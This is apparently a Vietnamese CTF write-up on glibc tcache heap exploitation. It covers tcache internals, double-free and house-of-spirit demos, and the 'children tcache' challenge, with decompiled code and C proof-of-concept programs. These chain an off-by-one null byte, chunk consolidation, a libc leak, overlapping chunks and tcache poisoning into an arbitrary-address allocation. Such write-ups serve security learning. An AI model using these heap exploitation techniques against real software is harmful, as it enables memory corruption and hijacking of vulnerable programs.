---
title: Tcache-writeup
date: 2025-02-16 00:00:00 +0800
categories: [pwn]
tags: [Heap,Tcache]
author: "kuvee"
layout: post
published: false
published: false
---

## tổng quan về tcache 

- tcache được giới thiệu trong glibc 2.26 với mục tiêu là để tăng tốc heap tuy nhiên cùng với đó là sự khônng an toàn của nó 



```c
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

- cả 2 hàm này đều có thể được gọi ở đàu các hàm [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) và [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) . ```tcache_put``` được gọi khi kích thước yêu cầu của vùng được phân bổ không lớn hơn 0x408 và tcache phù hợp với kích thước nhất định không full  . số lượng tối đa các chunk trong tcache là ```mp_.tcache_count``` và mặc định sẽ là 7 
- ```tcache_get``` được gọi khi chúng ta yêu cầu 1 khối có kích thước bằng ```tcache_bin``` và bin đó chứa 1 số chunk . mỗi tcache bin chứa các chunk chỉ có 1 size chung . nó là 1 dslk đơn được tuân theo quy tắc LIFO giống như fastbin nhưng khác là tcache nó nhớ có bao nhiêu thuộc về nó trong ```tcache->counts[tc_idx]```

- calloc sẽ không phân bổ được từ tcache 

### kĩ thuật tcache attack


- demo : nếu chạy nó cùng với phiên bản 2.26  nó sẽ có cùng 1 con trỏ
```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	char *a = malloc(0x38);
	free(a);
	free(a);
	printf("%p\n", malloc(0x38));
	printf("%p\n", malloc(0x38));
}
```

#### house of spirit 

```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	long int var[10];
	var[1] = 0x40; // set the size of the chunk to 0x40

	free(&var[2]);
	char *a=malloc(0x38);
	printf("%p %p\n",a ,&var[2]);
}
```

- output : ```0x7fff899700c0 0x7fff899700c0```

và còn nhiều thứ khác nữa ...

## children tcache 

- bài này sẽ có 3 option chính

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  unsigned __int64 choice; // rax

  setup(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = sub_B67();
      if ( choice != 2 )
        break;
      view();
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        free_();
      }
      else
      {
        if ( choice == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( choice != 1 )
        goto LABEL_13;
      alloc();
    }
  }
}
```


- option1 : số chunk tối đa sẽ là 10 , size < 0x2000 , ta sẽ được input dữ liệu vào ```s``` và dùng ```strcpy``` để sao chép vào chunk[idx]

```c
unsigned __int64 sub_CB7()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s[8216]; // [rsp+20h] [rbp-2020h] BYREF
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !ptr[i] )
      break;
  }
  printf("Size:");
  size = sub_B67();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  sub_BC8(s, (unsigned int)size);
  strcpy(dest, s);
  ptr[i] = dest;
  size_array[i] = size;
  return __readfsqword(0x28u) ^ v5;
}
```


- option2 : nhập 1 idx và check chunk đó có tồn tại không , nếu có thì in dữ liệu ra 

```c
int sub_E4B()
{
  __int64 v0; // rax
  unsigned __int64 idx; // [rsp+8h] [rbp-8h]

  printf("Index:");
  idx = sub_B67();
  if ( idx > 9 )
    exit(-3);
  v0 = *((_QWORD *)&ptr + idx);
  if ( v0 )
    LODWORD(v0) = puts(*((const char **)&ptr + idx));
  return v0;
}
```


- option3 : nhập 1 idx và memset dữ liệu của chunk , sau đó giải phóng chunk và xóa con trỏ -> không có UAF

```c
int sub_EC9()
{
  unsigned __int64 idx; // [rsp+8h] [rbp-8h]

  printf("Index:");
  idx = sub_B67();
  if ( idx > 9 )
    exit(-3);
  if ( ptr[idx] )
  {
    memset((void *)ptr[idx], 218, size_array[idx]);
    free((void *)ptr[idx]);
    ptr[idx] = 0LL;
    size_array[idx] = 0LL;
  }
  return puts(":)");
}
```

- ở option1 ta thấy có 1 ```one_of_bytes``` , nó sử dụng ```strcpy``` hàm này sẽ dừng khi gặp null bytes , tuy nhiên nếu ta filter nó tới size của chunk khác điều này hoàn toàn có thể


- ở đây ta sẽ lợi dụng byteNULL dẫn đến sự hợp nhất chunk

ta sẽ setup ```prev_inuse``` của chunk c để nó nghĩ rằng chunk cạnh nó đã được free, tiếp theo là setup ```prev_size``` đến tổng kích thước của a và b

```cs
#include<stdlib.h>
#include<stdio.h>
 
int main()
{
    // alocate 3 chunks
    char *a = malloc(0x108);
    char *b = malloc(0xf8);
    char *c = malloc(0xf8);

    printf("a: %p\n",a);
    printf("b: %p\n",b); 

    free(a);
    
    // buffer overflow b by 1 NULL byte
    b[0xf8] = '\x00'; //clear prev in use of c
    *(long*)(b+0xf0) = 0x210; //We can set prev_size of c to 0x210 bytes
    
    // c have prev_in_use=0 and prev_size=0x210 so it will consolidate 
    // with a and b and it will be put in unsorted bin
    free(c);

    // now we can allocate chunks from the area of a|b|c
    char *A = malloc(0x108);
    printf("A: %p\n",A); 

    // leak libc
    printf("B content: %p\n",((long*)b)[0]);
}
```

output: 

```cs
a: 0x602010
b: 0x602120
A: 0x602010
B content: 0x7ffff7dd1b78
```

- và nó sẽ xảy ra sự hợp chất chunk từ a->b>c . sau khi malloc() lại chunk A , unsorted bin chia thành 2 phần  , 1 phần được malloc lấy và 1 phần vẫn ở unsorted-bin và chunk đó bắt đầu bằng chunk B , tuy nhiên ở đây còn 1 điểm lợi nữa là B và b sẽ trỏ cùng 1 chunk có size là 0x1f8


- cuối cùng , trông nó sẽ như sau:

```cs
#include<stdlib.h>
#include<stdio.h>
 
char* tcache1[7]; 
char* tcache2[7]; 
 
long var;
 
int main()
{
    char *a = malloc(0x108);
    char *b = malloc(0xf8);
    char *c = malloc(0xf8);
	

    printf("a: %p\n",a);
    printf("b: %p\n",b); 
    printf("c: %p\n",c);

    // make 0xf8 tcache full
    for(int i=0;i<7;i++)
        tcache1[i]=malloc(0xF8);
    for(int i=0;i<7;i++)
        free(tcache1[i]);

    // make 0x108 tcache full
    for(int i=0;i<7;i++)
        tcache2[i]=malloc(0x108);
    for(int i=0;i<7;i++)
        free(tcache2[i]);

    free(a); // a goes to an unsorted bin

    tcache1[0]=malloc(0xF8);//creates one free place in 0xf8 tcache 
    // b will go to tcache after free(). 

    // in the CTF task we can only write data to chunks
    // right after mallocing this chunk
    free(b);
    b = malloc(0xf8);
    // buffer overflow b by 1 NULL byte
    b[0xf8] = '\x00'; //clear prev in use of c
    *(long*)(b+0xf0) = 0x210; //We can set prev_size of c to 0x210 bytes
    printf("b: %p\n",b);
   
    // make 0xf8 tcache full
    free(tcache1[0]);

    // c have prev_in_use=0 and prev_size=0x210 so it will consolidate 
    // with a and b and it will be put in unsorted bin
    free(c);
    
    // make 0x108 tcache empty
    for(int i=0;i<7;i++)
        tcache2[i]=malloc(0x108);


    // now we can allocate chunks from the area of a|b|c
    char *A = malloc(0x108);
    printf("A: %p\n",A);

    // leak libc
    printf("b content: %p\n",((long*)b)[0]);

    // make 0x108 tcache full because we can have max 10 chunks allocated 
    for(int i=0;i<7;i++)
        free(tcache2[i]);

    // Both 0xf8 and 0x108 tcache bins are full

    // let's allocate chunk that overlaps b.
    char *B = malloc(0x1F8);
    printf("B: %p\n",B);

    // now, chunks B and b are allocated and have the same address. 
    // now we can use double free and tcache poisoning attack

    // double free
    free(B);
    free(b);
    // now, 0x1F8 tcache bin contains 2 the same chunks 

    // allocate one of them and set next pointer to known address
    b = malloc(0x1F8);
    *(long*)(b) = &var;
    
    malloc(0x1F8);
	
    // the allocated chunk will have an address of variable var
    char *super_pointer = malloc(0x1F8);
	
    printf("%p %p\n",super_pointer,&var);
}
```

